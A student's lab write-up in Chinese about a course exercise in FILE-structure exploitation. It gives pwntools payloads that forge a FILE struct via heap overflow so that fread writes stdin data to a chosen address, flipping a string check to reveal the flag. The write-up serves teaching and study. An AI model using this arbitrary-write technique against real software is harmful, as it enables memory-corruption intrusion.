# lab_aaw

1. 這題的原理跟 lab_aar 類似，一樣是用 overflow 去改寫 FILE 的結構，來達到任意讀或寫，理解完 fread 得過程後，嘗試去寫出 payload 但一直失敗，所以還是參考 example 去構造 file structure，但這邊卡關的時間比 lab_aar 還有久，原因是因為，寫完 payload 後，一直去檢查我送入的 payload 在程式中，用 gdb 檢查 heap 的情況，但這邊一直看不太出來問題出在哪裡。

```python
flag = 0x404070
size = 0x50

fileStr = FileStructure()
fileStr.flags = 0xfbad0000
fileStr._IO_buf_base = flag
fileStr._IO_write_base = flag
fileStr._IO_buf_end = flag + size
fileStr._IO_read_ptr = 0x0
fileStr._IO_read_end = 0x0
fileStr.fileno = 0x0
#print(fileStr)
payload = (flat(0,0,0,0x1e1) +  bytes(fileStr))[0:19*0x8]
```

![截圖 2022-12-12 下午8.43.16.png](lab_aaw%20ed6e65fb68e448458e188e36ec5ba9ff/%25E6%2588%25AA%25E5%259C%2596_2022-12-12_%25E4%25B8%258B%25E5%258D%25888.43.16.png)

1. 我還是重新去理將老師上課講義及 example.c 裡面的內容，因為 aaw 是要把從 stdin 讀取的資料寫到特定位址，要控制的是 fread 的流程。
a. 所以 flags 要設置成
    
        flags  & ~NO_READS 代表可讀
        flags & ~EOF_SEEN 代表避免被視為 EOF
    
        =>  flags &= ~(NO_READ | EOF_SEEN) : flags 設置為可讀，且避免被視為 EOF
    
        flags |= MAGIC 魔數，通常用來判斷檔案有沒有被篡改
    
        所以這裡得 FLAG 為
    
    flags &= ~(NO_READ | EOF_SEEN)
    
    flags |= MAGIC
    
    ![Untitled](lab_aaw%20ed6e65fb68e448458e188e36ec5ba9ff/Untitled.png)
    
    b. fileno = 0 (從 stdin 讀取)
    
    c. IO part
    
    避免複製，因此 read_end == read_ptr ⇒ read_end = read_ptr = 0 
    
         buf_base 指向目標位址 ⇒ buf_base = target_address
    
         buf_end 設為 buf_base + 夠大的值 (至少 >= want) ⇒ buf_end = buf_base + largevalue
    
2. 然後，我再重新去檢查程式的原始碼，這邊要想辦法將 owo 裡面的內容改寫，讓這邊字串比對會不同。另外，還檢查到我這邊 buf_base 是要指向目標位置，buf 設為 buf_base+夠大的值，而我前面設定的目標位置是錯的，也沒有設定夠大的值進去。

```python
if (strcmp(owo, "OWO!") != 0)
	write(1, flag, sizeof(flag));
```

![截圖 2022-12-12 下午10.41.04.png](lab_aaw%20ed6e65fb68e448458e188e36ec5ba9ff/%25E6%2588%25AA%25E5%259C%2596_2022-12-12_%25E4%25B8%258B%25E5%258D%258810.41.04.png)

1. 然後我將3.提到 debug 到的錯誤修正後，將payload 改寫為如下面的 code ( 前面的 flag 跟 sizeof(flag) 其實沒有用到，反而會要用到 target address )，將payload 送出後再輸入任意字串後，就能拿到 FLAG{sushi}。

```python
write_base = 0x404070
largevalue = 0x50

fileStr = FileStructure()
fileStr.flags = 0xfbad0000
fileStr._IO_buf_base = write_base
fileStr._IO_write_base = write_base
fileStr._IO_buf_end = write_base + largevalue
fileStr._IO_read_ptr = 0x0
fileStr._IO_read_end = 0x0
fileStr.fileno = 0x0
#print(fileStr)
payload = (flat(0,0,0,0x1e1) +  bytes(fileStr))[0:19*0x8]
```

![截圖 2022-12-12 下午10.48.22.png](lab_aaw%20ed6e65fb68e448458e188e36ec5ba9ff/%25E6%2588%25AA%25E5%259C%2596_2022-12-12_%25E4%25B8%258B%25E5%258D%258810.48.22.png)